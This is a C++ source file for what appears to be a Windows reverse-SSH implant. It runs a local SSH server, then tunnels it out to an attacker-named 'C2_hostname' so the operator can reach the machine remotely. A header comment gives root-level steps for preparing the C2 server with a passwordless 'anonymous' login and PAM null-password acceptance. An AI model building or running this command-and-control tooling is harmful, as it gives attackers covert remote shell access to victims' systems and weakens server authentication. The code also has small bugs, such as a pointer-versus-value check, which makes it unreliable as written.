#define LIBSSH_STATIC 1
#include <libssh/libssh.h>
#include <stdlib.h>
#include <stdio.h>
#include <thread>
#include <string.h>

#include "server.h"
#include "client.h"

/* Run all of this as root
Create a new user:
adduser --disabled-password anonymous

Disable his shell
usermod -s /bin/false anonymous

Make the password actually empty:
sed -i -re 's/^anonymous:[^:]+:/anonymous::/' /etc/passwd /etc/shadow

Allow blank passwords for SSH sessions in PAM: edit /etc/pam.d/sshd and replace the line that reads @include common-auth with:
auth [success=1 default=ignore] pam_unix.so nullok
auth requisite pam_deny.so
auth required pam_permit.so

Allow blank passwords for SSH sessions of anonymous in /etc/ssh/sshd_config:
PermitEmptyPasswords yes

Restart sshd:
systemctl restart ssh
*/


void help(char* self) {
    printf("Usage: %s [user@]C2_hostname [LOCAL_SSH_SERVER_PORT]\n", self);
    printf("Example: %s user@C2_hostname\n", self);
    printf("Example: %s user@C2_hostname 1234\n", self);  
    printf("Example: %s hostname\n", self);
    printf("Defaults: user is `anonymous` and LOCAL_SSH_SERVER_PORT is 2222\n", self);
    exit(1);
}

void parse_args(int argc, char** argv,
    char** C2_host,
    int* ssh_server_port_int,
    char* username) {

    char* C2_port = NULL;
    char* ssh_server_port = NULL;
    if (argc < 2 || argc > 3) {
        help(argv[0]);
    }

    *C2_host = strchr(argv[1], '@');
    if (*C2_host != NULL){
        *C2_host[0] = '\0';
        (*C2_host)++;
        strcpy_s(username, 100, argv[1]);
    }
    else {
        *C2_host = argv[1];
        strcpy_s(username, 100, "anonymous"); // default user
    }

    if (argc == 3) {
        ssh_server_port = argv[2];
        *ssh_server_port_int = atoi(ssh_server_port);
        if (ssh_server_port_int == 0)
            help(argv[0]);
    }

}



int main(int argc, char** argv){
    char* C2_port = NULL;    
    char* C2_host = NULL;
    char* ssh_server_port = NULL;
    int ssh_server_port_int = 2222;
    char username[101] = {0};

    
    parse_args(argc, argv, &C2_host, &ssh_server_port_int, username);

    ssh_init(); // mandatory

    auto server = SSHServer();
    std::thread server_thread(server.run, ssh_server_port_int);
    //server.run(ssh_server_port_int);

    //// client
    auto client = SSHClient();
    std::thread client_thread(client.run, username, C2_host, ssh_server_port_int);

    server_thread.detach();
    Sleep(1000);
    client_thread.detach();
    while (true)
    {
        Sleep(99999);
    }
    return 0;
}